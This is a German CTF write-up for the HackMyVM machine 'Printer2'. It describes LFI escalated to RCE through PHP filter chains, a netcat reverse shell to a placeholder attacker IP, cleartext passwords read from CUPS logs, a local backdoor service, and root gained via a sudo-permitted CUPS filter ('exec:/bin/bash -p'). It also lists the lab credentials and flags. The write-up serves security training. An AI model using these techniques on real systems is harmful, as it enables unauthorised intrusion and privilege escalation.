# Printer2 - HackMyVM (Medium)

![Printer2.png](Printer2.png)

## Übersicht

*   **VM:** Printer2
*   **Plattform:** HackMyVM (https://hackmyvm.eu/machines/machine.php?vm=Printer2)
*   **Schwierigkeit:** Medium
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 22. Mai 2023
*   **Original-Writeup:** https://alientec1908.github.io/Printer2_HackMyVM_Medium/
*   **Autor:** Ben C.

## Kurzbeschreibung

Das Ziel dieser Challenge war es, Root-Rechte auf der Maschine "Printer2" zu erlangen. Der Weg dorthin begann mit der Entdeckung einer Subdomain (`printer4life.printer.hmv`) über den Quellcode der Hauptseite. Auf dieser Subdomain wurde eine Local File Inclusion (LFI)-Schwachstelle in `index.php` (Parameter `page`) gefunden und mittels PHP-Filterketten zu Remote Code Execution (RCE) eskaliert, was zu einer Shell als `www-data` führte. Die erste Rechteausweitung zum Benutzer `mabelle` gelang durch das Finden von Klartext-Credentials (`mabelle:LIrmxk8EYtD`) in CUPS-Logdateien. Als `mabelle` wurde ein lokaler Dienst auf Port 1001 entdeckt, der sich als Backdoor in einem Druckerfilter herausstellte und das Passwort (`wK4EyQ15Cga`) für den Benutzer `kierra` preisgab. Die finale Eskalation zu Root erfolgte durch Ausnutzung einer unsicheren `sudo`-Regel, die `kierra` erlaubte, den CUPS-Filter `/usr/lib/cups/filter/rastertopwg` als Root auszuführen. Dieser Filter war anfällig für Command Injection über Argumente (`exec:COMMAND`).

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   Python2 (für alten CUPS-Exploit-Versuch)
*   `gobuster`
*   `nikto`
*   `nc` (netcat)
*   `wfuzz`
*   `curl`
*   Python3 (`php_filter_chain_generator.py`, Shell-Stabilisierung)
*   `find`
*   `grep`
*   `su`
*   `ssh` (für `mabelle`-Login)
*   `sudo`
*   `getcap`
*   `ss`
*   `telnet`
*   Standard Linux-Befehle (`cat`, `ls`, `id`, `cd`, `bash`, `stty`, `export`)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Printer2" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Web Enumeration:**
    *   IP-Adresse des Ziels (192.168.2.118) mit `arp-scan` identifiziert. Hostname `printer.hmv` in `/etc/hosts` eingetragen.
    *   `nmap`-Scan offenbarte Port 22 (SSH, OpenSSH 8.4p1), 80 (HTTP, Apache 2.4.56) und 631 (IPP, CUPS 2.3.3op2). Ein CUPS-Exploit-Versuch (CVE-2015-1158) scheiterte.
    *   `gobuster` auf Port 80 fand `/images`. `nikto` bestätigte Directory Indexing für `/images` und meldete fehlende Sicherheitsheader.
    *   Im Quellcode von `http://printer.hmv/` wurde ein JavaScript-Hinweis auf die Subdomain `printer4life.printer.hmv` gefunden. Diese wurde in `/etc/hosts` eingetragen.
    *   `gobuster` auf `http://printer4life.printer.hmv` fand u.a. `index.php`, `hp.php`, `canon.php`, `epson.php`.

2.  **Initial Access (LFI zu RCE als `www-data`):**
    *   Eine Local File Inclusion (LFI)-Schwachstelle wurde in `http://printer4life.printer.hmv/index.php` im GET-Parameter `page` gefunden (`?page=/etc/passwd`).
    *   Der Quellcode von `index.php` (ausgelesen via LFI und `php://filter/convert.base64-encode/resource=index.php`) bestätigte die direkte `include($page)`-Schwachstelle.
    *   Mittels `php_filter_chain_generator.py` wurde eine PHP-Filterkette für den Payload `` erstellt.
    *   Die generierte Filterketten-URL (`...index.php?page=php://filter/.../resource=php://temp&cmd=...`) wurde genutzt, um eine Netcat-Reverse-Shell (`nc -e /bin/bash ANGRIFFS_IP 9001`) als `www-data` zu starten.

3.  **Privilege Escalation (von `www-data` zu `mabelle` via Log Leak):**
    *   Als `www-data` wurde in einer Logdatei (vermutlich CUPS `access_log`) ein Eintrag gefunden, der die erfolgreiche Authentifizierung von `mabelle` mit dem Passwort `LIrmxk8EYtD` im Klartext protokollierte.
    *   Mit `su mabelle` und diesem Passwort wurde zu `mabelle` gewechselt.
    *   Im Home-Verzeichnis von `mabelle` wurde deren privater SSH-Schlüssel (`id_rsa`) gefunden, was einen direkten SSH-Login als `mabelle` ermöglichte.

4.  **Privilege Escalation (von `mabelle` zu `kierra` via Backdoor):**
    *   Als `mabelle` zeigte `ss -atlpn` einen lokalen Dienst auf Port 1001.
    *   Eine `telnet`-Verbindung zu `127.0.0.1 1001` offenbarte eine Backdoor, die nach einem "Filter name" fragte.
    *   Durch Eingabe eines gültigen CUPS-Filternamens (z.B. `rastertopwg.c` oder `rastertopwg`, gefunden durch `ls /opt/cups-2.3.3/filter/`) gab der Dienst das Passwort `wK4EyQ15Cga` preis.
    *   Mit `su kierra` und dem Passwort `wK4EyQ15Cga` wurde zu `kierra` gewechselt.
    *   Die User-Flag (`63e2f2ec7e3dbae87afc4e0e86d0867b`) wurde in `/home/kierra/user.txt` gefunden.

5.  **Privilege Escalation (von `kierra` zu `root` via `sudo` CUPS Filter Exploit):**
    *   `sudo -l` als `kierra` zeigte, dass der CUPS-Filter `/usr/lib/cups/filter/rastertopwg` als jeder Benutzer (einschließlich `root`) ohne Passwort ausgeführt werden durfte: `(ALL : ALL) /usr/lib/cups/filter/rastertopwg`.
    *   Durch Ausführen von `sudo -u root /usr/lib/cups/filter/rastertopwg exec:/bin/bash -p` wurde eine Root-Shell erlangt. Der Filter erlaubte die Ausführung von Befehlen über das Argument `exec:COMMAND`.
    *   Die Root-Flag (`052cf26a6e7e33790391c0d869e2e40c`) wurde in `/root/root_flag.txt` gefunden.

## Wichtige Schwachstellen und Konzepte

*   **Information Disclosure (Subdomain im Quellcode):** Eine Subdomain wurde durch Analyse des JavaScript-Codes der Hauptseite gefunden.
*   **Local File Inclusion (LFI) mit PHP Filter Chains:** Eine LFI in `index.php` wurde mittels PHP-Filterketten zu Remote Code Execution (RCE) eskaliert.
*   **Klartextpasswörter in Logdateien:** CUPS-Logs enthielten ein Benutzerpasswort im Klartext.
*   **Backdoor in lokalem Dienst:** Ein Dienst auf Port 1001 fungierte als Backdoor und gab ein weiteres Benutzerpasswort preis.
*   **Unsichere `sudo`-Regel (CUPS Filter):** Ein Benutzer durfte einen CUPS-Filter als Root ausführen. Dieser Filter war anfällig für Command Injection über Argumente, was zur Root-Eskalation führte.
*   **Fehlendes `HttpOnly`-Flag für Session-Cookies (Port 631, CUPS):** Ein potenzielles Risiko, das hier aber nicht ausgenutzt wurde.

## Flags

*   **User Flag (`/home/kierra/user.txt`):** `63e2f2ec7e3dbae87afc4e0e86d0867b`
*   **Root Flag (`/root/root_flag.txt`):** `052cf26a6e7e33790391c0d869e2e40c`

## Tags

`HackMyVM`, `Printer2`, `Medium`, `LFI`, `PHP Filter Chain`, `RCE`, `Log Leak`, `Password Disclosure`, `Backdoor`, `CUPS Exploit`, `sudo Exploit`, `Command Injection`, `Linux`, `Web`, `Privilege Escalation`, `Apache`, `CUPS`
